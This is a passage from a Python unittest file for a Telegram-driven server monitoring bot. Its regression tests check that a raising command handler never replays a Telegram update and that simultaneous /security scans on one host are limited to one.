                # A real offset is still read, and the file is not rewritten.
                monitor.save_update_offset(9)
                self.assertEqual(monitor.load_update_offset(), 9)
                self.assertEqual(open(path).read(), "9")


class RegRaisingHandlerOffsetTests(unittest.TestCase):
    """
    REG-REV-TELEGRAM-001 — a raising handler never rewinds the in-memory offset.

    The offset is acknowledged durably BEFORE the handler runs, so a handler that
    raises must not leave the caller polling with a stale offset: Telegram would
    replay the same update_id and the same command would execute twice.
    """

    INSTANCE = {"name": "AURORA", "chat_id": "-1001", "is_local": True,
                "is_windows": False, "index": 1, "security": {}}

    def test_reg_13_a_raising_handler_does_not_execute_one_update_twice(self):
        """REG-REV-TELEGRAM-001: 2 polls, 1 handler invocation, monotonic offset."""
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.dict(os.environ, {"MONITOR_BOT_STATE_DIR": tmp}):
                monitor.save_update_offset(1)
                calls, polled = [], []

                def raising(chat_id, inst):
                    calls.append(chat_id)
                    # The real shape of the defect: cmd_zombie does
                    # int(count.strip()), cmd_docker does c['id'][:12].
                    raise ValueError("invalid literal for int() with base 10: ''")

                batch = [{"update_id": 7,
                          "message": {"chat": {"id": "-1001"}, "text": "/security"}}]

                class Reply:
                    def json(self):
                        return {"result": list(batch)}

                def fake_get(url, params=None, timeout=None):
                    polled.append(params["offset"])
                    if len(polled) >= 3:
                        # Leave the real poll loop on a signal `except Exception`
                        # does not catch, exactly as a shutdown would.
                        raise KeyboardInterrupt
                    return Reply()

                buffer = io.StringIO()
                with (
                    mock.patch.dict(monitor.COMMANDS, {"/security": raising}),
                    mock.patch.dict(monitor.CHAT_TO_INSTANCE, {"-1001": self.INSTANCE}),
                    mock.patch.object(monitor.requests, "get", fake_get),
                    mock.patch.object(monitor.time, "sleep"),
                    redirect_stdout(buffer),
                ):
                    with self.assertRaises(KeyboardInterrupt):
                        monitor.handle_commands()

                # The operator still sees the handler failure; it is not swallowed.
                logged = buffer.getvalue()
                self.assertIn("Polling error: invalid literal for int()", logged)
                self.assertIn("[CMD] update_id=7 /security instance=AURORA "
                              "(chat -1001)", logged)
                # One update_id, one execution, whatever the handler did.
                # A raising handler may not run twice for one update_id.
                self.assertEqual(calls, ["-1001"])
                # The second poll carried the advanced offset, never the stale one.
                self.assertEqual(polled[1], 8)
                self.assertGreaterEqual(polled[1], 8)
                self.assertEqual(monitor.load_update_offset(), 8)

    def test_reg_13_a_later_failing_update_does_not_replay_an_earlier_one(self):
        """REG-REV-TELEGRAM-001: an aborting batch never re-runs what already ran."""
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.dict(os.environ, {"MONITOR_BOT_STATE_DIR": tmp}):
                monitor.save_update_offset(1)
                ran, polled = [], []

                def ok(chat_id, inst):
                    ran.append("/security")

                def raising(chat_id, inst):
                    ran.append("/services")
                    raise ValueError("boom")

                batch = [{"update_id": 10,
                          "message": {"chat": {"id": "-1001"}, "text": "/security"}},
                         {"update_id": 11,
                          "message": {"chat": {"id": "-1001"}, "text": "/services"}}]

                class Reply:
                    def json(self):
                        return {"result": list(batch)}

                def fake_get(url, params=None, timeout=None):
                    polled.append(params["offset"])
                    if len(polled) >= 3:
                        raise KeyboardInterrupt
                    return Reply()

                with (
                    mock.patch.dict(monitor.COMMANDS,
                                    {"/security": ok, "/services": raising}),
                    mock.patch.dict(monitor.CHAT_TO_INSTANCE, {"-1001": self.INSTANCE}),
                    mock.patch.object(monitor.requests, "get", fake_get),
                    mock.patch.object(monitor.time, "sleep"),
                    redirect_stdout(io.StringIO()),
                ):
                    with self.assertRaises(KeyboardInterrupt):
                        monitor.handle_commands()

                self.assertEqual(ran, ["/security", "/services"])
                # The second poll carries the offset the aborted batch reached.
                self.assertEqual(polled[1], 12)
                self.assertGreaterEqual(polled[1], 12)
                self.assertEqual(monitor.load_update_offset(), 12)


class RegScanGuardTests(unittest.TestCase):
    """REG-10 — two simultaneous /security requests start only one scan."""

    AURORA = {"name": "AURORA", "chat_id": "-1001", "is_local": True,
              "is_windows": False, "index": 1, "security": {}}
    SAME_NAME_OTHER_HOST = {"name": "AURORA", "chat_id": "-1002", "is_local": True,
                            "is_windows": False, "index": 2, "security": {}}

    def setUp(self):
        self.reset_guard()

    def tearDown(self):
        self.reset_guard()

    def reset_guard(self):
        with monitor._security_scans_lock:
            monitor._security_scans_in_flight.clear()

    def harness(self, collect):
        """A send_message recorder plus a Bedrock stub for one scan run."""
        send = mock.Mock()
        return (mock.patch.object(monitor, "send_message", send),
                mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                                 new=_async("### FINDINGS\nok")), send,
                mock.patch.object(monitor, "_collect_security_findings", collect))

    def texts(self, send):
        return [call.args[1] for call in send.call_args_list]

    def test_reg_10_only_one_of_two_simultaneous_scans_starts(self):
        """
        REG-10: one collection, one refusal, and both callers finish.

        The second request is started while the first is provably inside the
        collector, so the refusal is caused by the in-flight scan and not by a
        scheduling accident.
        """
        entered = threading.Event()
        release = threading.Event()
        calls = []
        send = mock.Mock()

        def blocking_collect(inst):
            calls.append(inst["index"])
            entered.set()
            if not release.wait(10):
                raise AssertionError("the collector stub was never released")
            return findings(MIXED)

        with (
            mock.patch.object(monitor, "_collect_security_findings",
                              side_effect=blocking_collect),
            mock.patch.object(monitor, "send_message", send),
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async("### FINDINGS\nok")),
        ):
            first = threading.Thread(target=monitor.cmd_security,
                                     args=("-1001", self.AURORA))
            first.start()
            self.assertTrue(entered.wait(10), "the collector was never entered")

            second = threading.Thread(target=monitor.cmd_security,
                                      args=("-1001", self.AURORA))
            second.start()
            second.join(20)
            self.assertFalse(second.is_alive(), "the refused request hung")

            release.set()
            first.join(20)
            self.assertFalse(first.is_alive(), "the first request hung")

        self.assertEqual(len(calls), 1)
        texts = self.texts(send)
        refused = [text for text in texts if "scan already running" in text]
        self.assertEqual(len(refused), 1)
        self.assertIn("AURORA", refused[0])
        # The refusal is the second request's only output: the notice, the
        # assessment and the advisory each appear exactly once, all from the
        # first request, so the refused request produced no partial report.
        self.assertEqual(len([t for t in texts if "Running security scan" in t]), 1)
        self.assertEqual(len([t for t in texts if "Authoritative assessment" in t]), 1)
        self.assertEqual(len([t for t in texts if "AI Security Commentary" in t]), 1)
        self.assertIs(refused[0], texts[1])
        for call in send.call_args_list:
            self.assertEqual(call.args[0], "-1001")
            self.assertLessEqual(len(call.args[1]), llm_analyzer.TELEGRAM_MAX_MESSAGE)

    def test_reg_10_the_guard_is_released_after_a_normal_scan(self):
        """REG-10 variant: a later sequential request collects normally."""
        calls = []
        with (
            mock.patch.object(monitor, "_collect_security_findings",
                              side_effect=lambda inst: calls.append(inst["index"])
                              or findings(MIXED)),
            mock.patch.object(monitor, "send_message") as send,
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async("### FINDINGS\nok")),
        ):
            for _ in range(3):
                monitor.cmd_security("-1001", self.AURORA)

        self.assertEqual(calls, [1, 1, 1])
        self.assertNotIn("scan already running", "\n".join(self.texts(send)))

    def test_reg_10_the_guard_is_released_after_a_raising_collector(self):
        """REG-10 variant: an exception still frees the slot for a later request."""
        with (
            mock.patch.object(monitor, "_collect_security_findings",
                              side_effect=RuntimeError("collector exploded")),
            mock.patch.object(monitor, "send_message") as send,
        ):
            with self.assertRaisesRegex(RuntimeError, "collector exploded"):
                monitor.cmd_security("-1001", self.AURORA)

        self.assertEqual(monitor._security_scans_in_flight, set())

        calls = []
        with (
            mock.patch.object(monitor, "_collect_security_findings",
                              side_effect=lambda inst: calls.append(1) or findings(MIXED)),
            mock.patch.object(monitor, "send_message", send),
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async("### FINDINGS\nok")),
        ):
            monitor.cmd_security("-1001", self.AURORA)

        self.assertEqual(len(calls), 1)
        self.assertEqual(monitor._security_scans_in_flight, set())

    def test_reg_10_a_second_host_with_the_same_name_is_not_blocked(self):
        """REG-10 variant: the guard key never collides across hosts or chats."""
        both_entered = threading.Barrier(2, timeout=10)
        calls = []
        send = mock.Mock()

        def barrier_collect(inst):
            calls.append(inst["index"])
            both_entered.wait()
            return findings(MIXED)

        with (
            mock.patch.object(monitor, "_collect_security_findings",
                              side_effect=barrier_collect),
            mock.patch.object(monitor, "send_message", send),
            mock.patch.object(llm_analyzer, "analyze_with_bedrock",
                              new=_async("### FINDINGS\nok")),
        ):
            threads = [
                threading.Thread(target=monitor.cmd_security, args=("-1001", self.AURORA)),
                threading.Thread(target=monitor.cmd_security,
                                 args=("-1002", self.SAME_NAME_OTHER_HOST)),
            ]
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join(20)
                self.assertFalse(thread.is_alive(), "two instances deadlocked each other")

        self.assertEqual(sorted(calls), [1, 2])
        self.assertNotIn("scan already running", "\n".join(self.texts(send)))


def _decoded(command):
    """
    The Python program a generated security command carries, or ''.

    Delegates to the single decoder the scanner tests use, so the Windows
    (gzip-compressed) and Linux (plain base64) forms are read the same way in
    both modules and cannot drift.
    """
    from tests.test_security_scanner import decode_remote_program

    return decode_remote_program(command)


def _async(value):
    async def coroutine(findings):
        if isinstance(value, Exception):
            raise value
        return value
    return coroutine


def _timestamp():
    from datetime import datetime
    return datetime(2026, 9, 29, 12, 0, 0, tzinfo=monitor.PH_TZ)


if __name__ == "__main__":
    unittest.main()
